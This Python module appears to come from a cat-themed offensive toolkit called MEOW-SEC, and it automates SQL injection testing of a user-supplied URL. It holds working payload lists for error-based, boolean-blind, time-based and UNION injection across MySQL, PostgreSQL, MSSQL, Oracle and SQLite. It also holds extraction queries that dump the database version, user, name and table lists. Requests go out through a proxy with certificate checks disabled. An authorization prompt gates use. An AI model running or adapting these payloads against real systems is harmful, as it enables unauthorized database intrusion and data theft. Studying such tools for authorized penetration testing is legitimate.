# -*- coding: utf-8 -*-
"""MEOW-SEC :: SQLI — Advanced SQL Injection Tester"""
import os, re, json, time
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN, CAT_FOUND
from rich.panel  import Panel
from rich.table  import Table
from rich.prompt import Prompt, Confirm
from rich.rule   import Rule
from rich        import box

try:
    import requests as _req
    _req.packages.urllib3.disable_warnings()
    HAS_REQUESTS = True
except Exception:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

_UA      = "MEOW-SQLI/1.0 (authorized-test)"
_TIMEOUT = 12

# ─── SIGNATURES D'ERREURS PAR DB ─────────────────────────────

_ERR_SIGS = {
    "MySQL":      ["you have an error in your sql syntax", "mysql_fetch",
                   "mysql_num_rows", "warning: mysql", "supplied argument is not a valid mysql",
                   "com.mysql.jdbc"],
    "MariaDB":    ["mariadb", "maria db", "you have an error in your sql syntax",
                   "mysql_fetch", "warning: mysqli", "com.mariadb.jdbc",
                   "er_parse_error", "er_syntax_error"],
    "PostgreSQL": ["pg_query", "pg_exec", "unterminated quoted string at or near",
                   "syntax error at or near", "postgresql error", "pgsql_query"],
    "MSSQL":      ["unclosed quotation mark", "microsoft ole db provider for sql server",
                   "odbc sql server driver", "incorrect syntax near", "sqlstate",
                   "mssql_query", "sqlsrv_query"],
    "Oracle":     ["ora-", "oracle error", "quoted string not properly terminated",
                   "oci_parse", "ora-00933"],
    "SQLite":     ["sqlite3_query", "sqlite_query", "sqlite error",
                   "unrecognized token", "near \""],
    "Generic":    ["sql syntax", "sql error", "database error", "db query failed",
                   "jdbc", "odbc", "warning: pg_"],
}

# ─── PAYLOADS ERROR-BASED ────────────────────────────────────

_ERROR_PROBES = [
    "'", "''", "1'", '"', '1"', "`", "1`", "1\\",
    "1'--", "1'-- -", "1' #", "1);--", "1'));--", "1)--;",
    "1' AND ''='", "1' OR ''='",
]

# ─── PAYLOADS BOOLEAN BLIND ──────────────────────────────────

_BOOL_PAIRS = [
    ("1' AND '1'='1'-- -",   "1' AND '1'='2'-- -"),
    ("1 AND 1=1-- -",        "1 AND 1=2-- -"),
    ("' OR 1=1-- -",         "' OR 1=2-- -"),
    ("1' AND 1=1 LIMIT 1--", "1' AND 1=2 LIMIT 1--"),
    ("1 OR 1=1--",           "1 OR 1=2--"),
]

# ─── PAYLOADS TIME-BASED ─────────────────────────────────────

_TIME_PAYLOADS = [
    ("1' AND SLEEP(4)-- -",                             "MySQL",      4.0),
    ("1 AND SLEEP(4)-- -",                              "MySQL",      4.0),
    ("1' OR SLEEP(4)-- -",                              "MySQL",      4.0),
    ("1' AND (SELECT 4 FROM (SELECT(SLEEP(4)))a)-- -",  "MySQL",      4.0),
    ("1'; WAITFOR DELAY '0:0:4'-- -",                   "MSSQL",      4.0),
    ("1; WAITFOR DELAY '0:0:4'-- -",                    "MSSQL",      4.0),
    ("1' AND pg_sleep(4)-- -",                          "PostgreSQL", 4.0),
    ("1 AND pg_sleep(4)-- -",                           "PostgreSQL", 4.0),
    ("1' OR pg_sleep(4)-- -",                           "PostgreSQL", 4.0),
    ("1' AND RANDOMBLOB(400000000)-- -",                "SQLite",     2.0),
    ("1 RLIKE SLEEP(4)",                                "MySQL",      4.0),
]

# ─── PAYLOADS UNION ──────────────────────────────────────────

_ORDER_BY = [f"1 ORDER BY {i}-- -" for i in range(1, 11)]

_UNION_NULL_TMPL  = "1 UNION SELECT {nulls}-- -"
_UNION_STR_MARKER = "MEOWCAT13371337"

# ─── EXTRACTION PAR DB ───────────────────────────────────────

_EXTRACT = {
    "MySQL": {
        "version": "' UNION SELECT @@version,NULL-- -",
        "user":    "' UNION SELECT user(),NULL-- -",
        "db":      "' UNION SELECT database(),NULL-- -",
        "tables":  "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -",
    },
    "PostgreSQL": {
        "version": "' UNION SELECT version(),NULL-- -",
        "user":    "' UNION SELECT current_user,NULL-- -",
        "db":      "' UNION SELECT current_database(),NULL-- -",
        "tables":  "' UNION SELECT string_agg(tablename,','),NULL FROM pg_tables WHERE schemaname='public'-- -",
    },
    "MSSQL": {
        "version": "' UNION SELECT @@version,NULL-- -",
        "user":    "' UNION SELECT user_name(),NULL-- -",
        "db":      "' UNION SELECT db_name(),NULL-- -",
        "tables":  "' UNION SELECT string_agg(name,','),NULL FROM sysobjects WHERE xtype='U'-- -",
    },
    "MariaDB": {
        "version": "' UNION SELECT @@version,NULL-- -",
        "user":    "' UNION SELECT user(),NULL-- -",
        "db":      "' UNION SELECT database(),NULL-- -",
        "tables":  "' UNION SELECT group_concat(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -",
        "engine":  "' UNION SELECT engine,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1-- -",
    },
    "SQLite": {
        "version": "' UNION SELECT sqlite_version(),NULL-- -",
        "tables":  "' UNION SELECT group_concat(name),NULL FROM sqlite_master WHERE type='table'-- -",
    },
    "Generic": {
        "version": "' UNION SELECT NULL,NULL-- -",
    },
}

# ─── HTTP HELPERS ────────────────────────────────────────────

def _get(url, timeout=_TIMEOUT):
    try:
        return _req.get(url, verify=False, timeout=timeout, allow_redirects=True,
                        proxies=_px(), headers={"User-Agent": _UA})
    except Exception:
        return None


def _post(url, data, timeout=_TIMEOUT):
    try:
        return _req.post(url, data=data, verify=False, timeout=timeout,
                         allow_redirects=True, proxies=_px(),
                         headers={"User-Agent": _UA})
    except Exception:
        return None


def _post_json(url, data, timeout=_TIMEOUT):
    try:
        return _req.post(url, json=data, verify=False, timeout=timeout,
                         allow_redirects=True, proxies=_px(),
                         headers={"User-Agent": _UA, "Content-Type": "application/json"})
    except Exception:
        return None


def _inject(url, param, payload):
    """Injecte payload dans le paramètre GET."""
    p  = urlparse(url)
    qs = parse_qs(p.query, keep_blank_values=True)
    qs[param] = [payload]
    return urlunparse(p._replace(query=urlencode(qs, doseq=True)))


# ─── TECHNIQUES DE DÉTECTION ─────────────────────────────────

def _error_based(url, param, method="GET", post_data=None):
    for probe in _ERROR_PROBES:
        if method == "GET":
            r = _get(_inject(url, param, probe))
        else:
            d = dict(post_data or {}); d[param] = probe
            r = _post(url, d)
        if not r:
            continue
        body = r.text.lower()
        for db, sigs in _ERR_SIGS.items():
            for sig in sigs:
                if sig in body:
                    find(f"Error-based SQLi [{RD}]{db}[/] on [{CY}]{param}[/] — [{OR}]{probe!r}[/]")
                    return [{"param": param, "type": "error-based", "db": db,
                             "payload": probe, "evidence": sig}]
    return []


def _boolean_blind(url, param, baseline_len, method="GET", post_data=None):
    for true_p, false_p in _BOOL_PAIRS:
        len_true = len_false = 0
        for payload, is_true in [(true_p, True), (false_p, False)]:
            if method == "GET":
                r = _get(_inject(url, param, payload))
            else:
                d = dict(post_data or {}); d[param] = payload
                r = _post(url, d)
            if not r:
                break
            if is_true:
                len_true = len(r.text)
            else:
                len_false = len(r.text)
        diff = abs(len_true - len_false)
        if diff > 80 and len_true and len_false:
            find(f"Boolean-blind SQLi on [{CY}]{param}[/] — response diff [{G1}]{diff}[/] chars")
            return [{"param": param, "type": "boolean-blind", "db": "Unknown",
                     "payload": f"{true_p} / {false_p}", "evidence": f"diff={diff}"}]
    return []


def _time_based(url, param, method="GET", post_data=None):
    for payload, db, delay in _TIME_PAYLOADS:
        try:
            t0 = time.time()
            if method == "GET":
                r = _get(_inject(url, param, payload), timeout=int(delay) + 6)
            else:
                d = dict(post_data or {}); d[param] = payload
                r = _post(url, d, timeout=int(delay) + 6)
            elapsed = time.time() - t0
            if elapsed >= delay - 0.5:
                find(f"Time-based SQLi [{RD}]{db}[/] on [{CY}]{param}[/] — {elapsed:.1f}s")
                return [{"param": param, "type": "time-based", "db": db,
                         "payload": payload, "evidence": f"{elapsed:.1f}s delay"}]
        except Exception:
            pass
    return []


def _union_detect_cols(url, param):
    """Compte les colonnes via ORDER BY."""
    last_ok = 1
    for i, probe in enumerate(_ORDER_BY, 1):
        r = _get(_inject(url, param, probe))
        if not r:
            break
        body = r.text.lower()
        if any(s in body for s in ["order by", "unknown column", "error in your sql",
                                   "bad request", "invalid", "syntax"]):
            break
        if r.status_code < 500:
            last_ok = i
    return last_ok


# ─── SAVE ────────────────────────────────────────────────────

def _save(target, results):
    os.makedirs("data", exist_ok=True)
    slug = re.sub(r"[^a-zA-Z0-9_-]", "_", target)[:40]
    fname = f"data/sqli_{slug}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "results": results,
                   "timestamp": datetime.now().isoformat()}, f, indent=2)
    ok(f"Results saved → [{CY}]{fname}[/]")


# ─── MAIN ────────────────────────────────────────────────────

def run():
    show_module_banner("sqli")
    cat_talk(CAT_SCAN, "Advanced SQL Injection — error, boolean-blind, time-based, UNION", RD)
    console.print()
    warn("AUTHORIZED USE ONLY — Unauthorized testing is illegal.")
    if not Confirm.ask(f"  [{OR}]◈ I confirm this is an authorized target[/]", default=False):
        info("Aborted."); return

    if not HAS_REQUESTS:
        err("requests library not available. Run: pip install requests"); return

    url = Prompt.ask(f"  [{G1}]◈ Target URL[/]").strip()
    if not url.startswith("http"):
        url = "https://" + url

    console.print(f"\n  [{G1}][1][/] GET parameters")
    console.print(f"  [{G1}][2][/] POST form body")
    console.print(f"  [{G1}][3][/] POST JSON body")
    method_choice = ask_choice("Method", "1")

    method    = "GET"
    post_data = {}

    parsed = urlparse(url)
    params = list(parse_qs(parsed.query).keys())

    if method_choice in ("2", "3"):
        method = "POST"
        param_str = Prompt.ask(f"  [{CY}]◈ Parameter name(s) (comma-sep)[/]", default="id").strip()
        params    = [p.strip() for p in param_str.split(",")]
        for p in params:
            post_data[p] = Prompt.ask(f"  [{CY}]◈ Default value for '{p}'[/]", default="1").strip()
    elif not params:
        param_str = Prompt.ask(f"  [{CY}]◈ Parameter name(s) to test (comma-sep)[/]", default="id").strip()
        params    = [p.strip() for p in param_str.split(",")]

    console.print(f"\n  [{G1}][1][/] Error-based only")
    console.print(f"  [{G1}][2][/] Boolean-blind only")
    console.print(f"  [{G1}][3][/] Time-based blind only")
    console.print(f"  [{G1}][4][/] UNION column detection")
    console.print(f"  [{G1}][5][/] All techniques  [{DM}](recommandé)[/]")
    mode = ask_choice("Technique", "5")

    info(f"Target [{CY}]{url}[/]  params {params}  method {method}")
    console.print()

    all_findings  = []
    detected_dbs  = set()

    for param in params:
        console.print(Rule(f"[{G1}] SQLI :: {param} ", style=G2))

        bl_r = _get(url) if method == "GET" else _post(url, post_data)
        bl_len = len(bl_r.text) if bl_r else 0

        if mode in ("1", "5"):
            info(f"  Error-based on [{CY}]{param}[/]...")
            findings = _error_based(url, param, method, post_data)
            all_findings.extend(findings)
            for f in findings: detected_dbs.add(f["db"])
            if not findings: info(f"  [{DM}]No error-based SQLi[/]")

        if mode in ("2", "5"):
            info(f"  Boolean-blind on [{CY}]{param}[/]...")
            findings = _boolean_blind(url, param, bl_len, method, post_data)
            all_findings.extend(findings)
            if not findings: info(f"  [{DM}]No boolean-blind SQLi[/]")

        if mode in ("3", "5"):
            info(f"  Time-based blind on [{CY}]{param}[/] (plus lent)...")
            findings = _time_based(url, param, method, post_data)
            all_findings.extend(findings)
            for f in findings: detected_dbs.add(f["db"])
            if not findings: info(f"  [{DM}]No time-based SQLi[/]")

        if mode in ("4", "5") and method == "GET":
            info(f"  UNION column count on [{CY}]{param}[/]...")
            n_cols = _union_detect_cols(url, param)
            info(f"  [{G1}]~{n_cols} column(s) detected via ORDER BY[/]")
            all_findings.append({
                "param": param, "type": "union-recon",
                "db": "Unknown", "payload": f"ORDER BY {n_cols}",
                "evidence": f"{n_cols} cols"
            })

    console.print()

    # Extraction payloads pour les DBs trouvées
    if detected_dbs and detected_dbs != {"Unknown"}:
        lines = []
        for db in detected_dbs:
            ext = _EXTRACT.get(db, _EXTRACT["Generic"])
            for what, pl in ext.items():
                lines.append(f"[{CY}]{db}[/] [{DM}]{what}:[/] [{OR}]{pl}[/]")
        if lines:
            console.print(Panel("\n".join(lines),
                                title=f"[{RD}]⚡ Data Extraction Payloads",
                                border_style=RD))

    vuln_findings = [f for f in all_findings if f["type"] != "union-recon"]
    if vuln_findings:
        cat_talk(CAT_FOUND, f"{len(vuln_findings)} SQL injection finding(s)!", G1)
        t = Table(title=f"[{G1}]SQLI Results[/]", box=box.MINIMAL_DOUBLE_HEAD,
                  border_style=G2, header_style=CY)
        t.add_column("Param",    min_width=12)
        t.add_column("Type",     min_width=16)
        t.add_column("DB",       min_width=12)
        t.add_column("Payload",  min_width=26)
        t.add_column("Evidence", min_width=20)
        for f in all_findings:
            t.add_row(f["param"], f"[{RD}]{f['type']}[/]", f["db"],
                      f["payload"][:42], f["evidence"][:30])
        console.print(t)
    else:
        ok("No SQL injection vulnerabilities detected.")

    _save(url, all_findings)
